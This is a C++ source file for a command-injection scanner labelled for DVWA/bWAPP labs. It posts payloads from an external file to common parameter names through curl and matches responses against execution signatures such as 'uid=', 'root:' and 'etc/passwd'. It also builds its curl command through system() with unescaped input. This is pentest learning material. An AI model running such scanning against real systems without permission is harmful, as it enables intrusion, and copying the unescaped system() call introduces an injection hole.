#include<iostream>
#include<windows.h>
#include<fstream>
#include<ctime>
using namespace std;
 
// ---------------------ANSI COLOR CODING-------------------------
void red () {cout<< "\033[31m";}
void green() {cout<< "\033[32m";}
void yellow() {cout<< "\033[33m";}
void cyan() {cout<< "\033[36m";}
void white()  {cout<< "\033[37m";}
void bold() {cout<< "\033[1m";}
void reset() {cout<< "\033[0m";}
// ---------------------------------------------------------------

// ------------------PRINT BANNER FUNCTION------------------------
 void printBanner(){
    cyan(); bold();
    cout<< "===============================================\n";
    cout<< "                COMMAND INJECTOR V2.0\n";
    cout<< "===============================================\n";
    reset();

    yellow();
    cout<< "     EDUCATIONAL PURPOSES ONLY-- DVWA/BWAPP LABS     " << endl;
    reset();

    red();
    cout<< "     TARGET : OWASP A03:2021 -- INJECTION  " << endl;
    reset();

    cyan();
    cout<< "==============================================================\n";
    reset();

 }
    // -------------------------LoadPayLoads()-----------------------------
    int loadPayLoads(string payloads[], int maxSize){
        ifstream file("payloads.txt");
        int count = 0;

        if(!file.is_open()) {
            red();
            cout<< "Errors: Could not open payLoads.txt file."<< endl;
            reset();
            return 0;
        }

        while (getline(file, payloads[count]) && count < maxSize){
            count++;
        }

        file.close();


        green();
        cout<< "[+] loaded "<< count << " payLoads from payLoads.txt file."<< endl;
        reset(); 

        return count;
    
    }

 // -------------------------SEND REQUEST------------------------------
    string sendRequest(string url, string parameter, string payload, string cookie){
        // step 1: build the full URL with payload injected
        string command = "curl -s -o response.txt -m 10 ";
if(cookie != ""){
    command += "-H \"Cookie: " + cookie + "\" ";
}
// POST data instead of GET
command += "--data \"" + parameter + "=" + payload + "&Submit=Submit\" ";
command += "\"" + url + "\"";
        // step 3: Run the curl command using system()
        
        system(command.c_str());

        // step 4: Read the response from response.txt
        string response = "";
        string line;
        ifstream file("response.txt");


        if(!file.is_open()) {
            red();
            cout<< "Errors: Could not open response.txt file."<< endl;
            reset();
            return "";
        }
        while(getline(file, line)) {
            response += line + "\n";
        }
        file.close();

        // step 5: Return the full response. 
        return response;
    }
 

    // ------------------------CHECK SIGNATURES----------------------------
    bool checkSignatures(string response, string &matchedSigns){
        // LIST OF SIGNATURES TO CHECK IN THE RESPONSE
        string signatures[7];
        signatures[0] = "uid=";
        signatures[1] = "root: ";
        signatures[2] = "www_data";
         signatures[3] = "drwxr";
        signatures[4] = "etc/passwd";
         signatures[5] = "Windows IP";
          signatures[6] = "Command not found.";
          //search each signature in the response

          for(int i=0; i<7; i++){
            if(response.find(signatures[i]) != string::npos){
                matchedSigns = signatures[i];
                return true;
            }
          }
            return false; //nothing found
           
    }
//--------------------------SAVE TO REPORT-------------------------
void savetoReport(string parameter, string payload, string status, string details){
    ofstream file("report.txt", ios::app);

    if(!file.is_open()){
        red();
        cout<< "[ERRORS] Cannot open report.txt for writing."<< endl;
        reset();
        return;
    }
    file << "---------------------------------------------\n";
    file <<  "Parameter: "<< parameter << endl;
    file <<  "Payload: "<< payload << endl;
    file <<  "Status: "<< status << endl;
    file <<  "Details: "<< details << endl;
    file << "---------------------------------------------\n";
    file << endl;
    file.close();
    
}
       void scanParameter(string url, string parameter, string targetIP, string payLoads[], int payLoadCount, string cookie){
            cout<< "\n[*] Scanning Parameter: "<< parameter << endl;
            reset();

            // step 1: second baseline request( normal IP, no Injection)
            string baselineResponse = sendRequest(url, parameter, targetIP, cookie);
            int baselineSize = baselineResponse.length();

            yellow();
            cout<< "[*] Baseline size: "<< baselineSize << "chars."<< endl;
            reset();

            // step 2: Loop through every PayLoad
            for(int i=0; i< payLoadCount; i++){
                // build full payload: targetIP + payload
                string fullPayload = targetIP + "+" + payLoads[i];
                cyan();
                cout<< "\n[*] Testing PayLoad "<< i + 1 << "/" << payLoadCount << ":" << fullPayload <<endl;

                reset();

                // send the request with the payload
                string response = sendRequest(url, parameter, fullPayload, cookie);
                int responseSize = response.length();

                // step 4: Check signatures in the response
                string matchedSign = " ";
                bool signatureFound = checkSignatures(response, matchedSign);

                // step 5: Check anomaly (size change alot)
                bool anomaly = false;
                if(baselineSize > 0 ){
                    double ratio = (double)responseSize / baselineSize;
                    if(ratio > 1.5 || ratio < 0.5){
                        anomaly = true;
                        
                    }
                }
                // step 6: Report Findings
                if (signatureFound) {
    green();
    cout << "[VULNERABLE] Signature found: " << matchedSign << endl;
    reset();
    savetoReport(parameter, fullPayload, "VULNERABLE", "Signature found: " + matchedSign);
} else if (anomaly) {
    yellow();
    cout << "[ANOMALY] Response size changed: " << responseSize << " chars (baseline: " << baselineSize << ")" << endl;
    reset();
    savetoReport(parameter, fullPayload, "ANOMALY", "Response size changed: " + to_string(responseSize) + " chars");
} else {
    white();
    cout << "[SAFE] No injection detected" << endl;
    reset();
}
                // step 7: Rate limit- wait 500ms before next request
                Sleep(500);


            }
            cyan();
            cout<< "\n[*] Scan complete for parameter: "<< parameter << endl;
            reset();
        }

        // -------------------------initReport--------------------------
        void initReport(string url, string targetIP){
            ofstream file("report.txt");
            if(!file.is_open()){
                red();
                cout<< "[ERRORS] Cannot create report.txt file."<< endl;
                reset();
                return;
            }
            //GET CURRENT TIME
            time_t now= time(0);
            string timestamp = ctime(&now);

            file << "=======================================================\n";
            file << "=========Command Injector V2.0 - Scan Report===========\n";
            file << "=======================================================\n";
            file << "=======Educational Purposes Only -DVWA/BWAPP LABS======\n";
            file << "=======Target: OWASP A03:2021 - INJECTIONS=============\n";
            file << "=======================================================\n";
            file << "Scan Date : " << timestamp;
            file << "Target URL: " << url << endl;
            file << "Target IP : " << targetIP << endl;
            file << "================================================" << endl; 
            file << endl;

            file.close();

            green();
            cout<< "[+] Report Initialized -- Report.txt file created."<< endl;
            reset();
        }


    //---------------------SHOW MAIN MENU---------------------
   void showMenu(){
    cyan();
    cout<< "==============================================\n";
    cout<< "             MAIN MENU                        \n";
    cout<< "==============================================\n";
    reset();

    white();
    cout<< "[1]. Start new scan"<< endl;
    cout<< "[2]. EXIT." << endl;
    reset();

    cyan();
    cout<< "============================================="<< endl;
    reset();
   }

 int main(){
    printBanner();
    

    string payloads[100];
    int total = loadPayLoads(payloads, 100);

     if(total == 0){
        red();
        cout<< "[ERRORS] No payloads loaded. Check Payloads.txt"<< endl;
        reset();
        return 1;
     }

     // PARAMETERS TO TEST
     string parameters[10];

     parameters[0] = "ip";
     parameters[1] = "host";
     parameters[2] = "cmd";
     parameters[3] = "command";
     parameters[4] = "exec";
     parameters[5] = "ping";
     parameters[6] = "query";
     parameters[7] = "input";
     parameters[8] = "target";
     parameters[9] = "search";
     int paramCount = 10;

     int choice = 0;
     while(true){
        showMenu();

        yellow();
        cout<< "\nEnter your choice: ";
        reset();
        cin>> choice;


        if(choice==1){
            //GET TARGET URL
            string url = " ";
            yellow();
            cout<< "\nEnter target URL"<< endl;
            cout<< "Example: http://192.168.56.101/DVWA/vulnerabilities/exec/" << endl;
            cout<< "URL: ";
            reset();
           cin >> url;
cin.ignore(1000, '\n');

string targetIP = "";
yellow();
cout << "\nEnter target IP to test" << endl;
cout << "IP: ";
reset();
cin >> targetIP;
            string cookie = "";
yellow();
cout << "\nEnter session cookie (press Enter to skip)" << endl;
cout << "Example: PHPSESSID=abc123; security=low" << endl;
cout << "Cookie: ";
reset();
cin.ignore(1000, '\n');
getline(cin, cookie);


            //INITIALIZE FRESH REPORT
        initReport(url, targetIP);


        cyan();
        cout << "\n[*] Starting scan on: "<< url << endl;
        cout << "[*] Target IP: "<< targetIP << endl;
        cout << "[*] Testing "<< paramCount << "Parameter with "<< endl;
        cout << total << "payload each"<< endl;
        reset();

        Sleep(1000);

            //scan every parameter
            for(int i=0; i < paramCount; i++){
                scanParameter(url, parameters[i], targetIP, payloads, total, cookie);

                //Save results to report
                //(saving happens inside scanParameter via saveToReport)
            }

            green();
            cout<< "\n[+] Scan Complete! "<< endl;
            cout<< "[+] Results saved to report.txt" << endl;
            reset();
            break;
        } else if(choice==2){
            cyan();
            cout<< "\n[*] Exiting Command Injector. Stay Ethical."<< endl;
            reset();
        }
     }

       

    return 0;
 }

